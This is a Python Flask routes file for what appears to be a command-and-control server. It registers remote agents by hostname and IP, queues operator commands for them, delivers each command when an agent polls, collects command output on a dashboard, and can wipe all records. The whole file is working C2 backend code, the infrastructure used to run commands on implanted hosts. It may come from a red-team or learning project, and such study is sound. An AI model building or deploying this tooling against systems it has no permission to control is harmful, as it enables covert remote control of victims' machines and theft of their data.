# c2/routes.py
from flask import request, jsonify, render_template
from db import get_conn
from uuid import uuid4
import json
from datetime import datetime, timezone


def register_routes(app, socketio=None):

    @app.route("/")
    def dashboard():
        with get_conn() as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM agents")
            agents = c.fetchall()
            c.execute("SELECT * FROM results ORDER BY timestamp DESC LIMIT 100")
            results = c.fetchall()
        return render_template("dashboard.html", agents=agents, results=results)

    @app.route("/debug", methods=["POST"])
    def debug():
        print("[*] DEBUG POST hit")
        print(f"Data: {request.data}")
        print(f"Form: {request.form}")
        return "OK"

    @app.route("/register", methods=["POST"])
    def register():
        try:
            data = request.get_json(force=True)
            if not data or "hostname" not in data:
                return jsonify({"error": "Missing hostname"}), 400

            agent_id = str(uuid4())
            with get_conn() as conn:
                c = conn.cursor()
                c.execute("""
                    INSERT INTO agents (agent_id, ip, hostname, tags, last_seen)
                    VALUES (?, ?, ?, ?, ?)
                """, (
                    agent_id,
                    request.remote_addr,
                    data.get("hostname"),
                    json.dumps(data.get("tags", [])),
                    datetime.now(timezone.utc).isoformat()
                ))
                conn.commit()

            print(f"[+] Registered agent: {agent_id} ({request.remote_addr})")

            if socketio:
                socketio.emit("new_agent", {
                    "agent_id": agent_id,
                    "ip": request.remote_addr,
                    "hostname": data.get("hostname"),
                    "tags": data.get("tags", []),
                    "last_seen": datetime.now(timezone.utc).isoformat()
                })

            return jsonify({"agent_id": agent_id})
        except Exception as e:
            print(f"[!] Registration error: {e}")
            return jsonify({"error": "Registration failed"}), 500

    @app.route("/task/<agent_id>", methods=["POST", "GET"])
    def task(agent_id):
        with get_conn() as conn:
            c = conn.cursor()

            # Check if the agent exists
            c.execute("SELECT 1 FROM agents WHERE agent_id = ?", (agent_id,))
            if not c.fetchone():
                print(f"[!] Agent {agent_id} not found. Prompting re-registration.")
                return jsonify({"error": "Agent not registered"}), 404

            if request.method == "POST":
                print(f"[POST] Raw data: {request.data}")
                print(f"[POST] Form keys: {request.form}")
                command = request.form.get("command")
                if not command:
                    return jsonify({"error": "Missing command"}), 400

                print(f"[+] Storing command for agent {agent_id}: {command}")
                c.execute("INSERT INTO tasks (agent_id, command, created_at) VALUES (?, ?, ?)", (
                    agent_id, command, datetime.now(timezone.utc).isoformat()))
                conn.commit()
                return "", 204

            else:  # GET request
                print(f"[~] Polling for task by agent {agent_id}")
                c.execute("SELECT command FROM tasks WHERE agent_id = ? LIMIT 1", (agent_id,))
                row = c.fetchone()
                if row:
                    c.execute("DELETE FROM tasks WHERE agent_id = ? AND command = ?", (agent_id, row[0]))
                    conn.commit()
                    print(f"[>] Delivering task: {row[0]}")
                    return jsonify({"task": row[0]})
                return jsonify({"task": None})

    @app.route("/report", methods=["POST"])
    def report():
        try:
            data = request.get_json(force=True)
            with get_conn() as conn:
                c = conn.cursor()
                c.execute("INSERT INTO results (agent_id, output, timestamp) VALUES (?, ?, ?)", (
                    data["agent_id"],
                    data["output"],
                    datetime.now(timezone.utc).isoformat()
                ))
                conn.commit()

            print(f"[<] Received result from {data['agent_id']}")

            if socketio:
                socketio.emit("new_result", {
                    "agent_id": data["agent_id"],
                    "output": data["output"],
                    "timestamp": datetime.now(timezone.utc).isoformat()
                })

            return jsonify({"status": "ok"})
        except Exception as e:
            print(f"[!] Error in /report: {e}")
            return jsonify({"error": "report failed"}), 500

    @app.route("/clean", methods=["POST"])
    def clean_all():
        with get_conn() as conn:
            c = conn.cursor()
            c.execute("DELETE FROM tasks")
            c.execute("DELETE FROM results")
            c.execute("DELETE FROM agents")
            conn.commit()
        print("[*] Cleaned stale agents, tasks, and results")
        return "", 204
